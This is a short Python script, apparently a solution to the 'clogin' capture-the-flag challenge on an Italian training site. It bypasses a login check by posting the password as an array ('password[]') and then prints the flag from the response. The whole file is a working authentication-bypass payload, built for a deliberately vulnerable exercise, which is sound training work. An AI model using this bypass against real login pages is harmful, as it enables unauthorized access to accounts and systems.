import requests
site = "http://clogin.challs.olicyber.it/"
r = requests.post(site, data={"password[]":"sas"})
for i in r.text.split("\n"):
    if "flag" in i:
        print(i.replace(" ","").replace("</div>",""), end="")
        break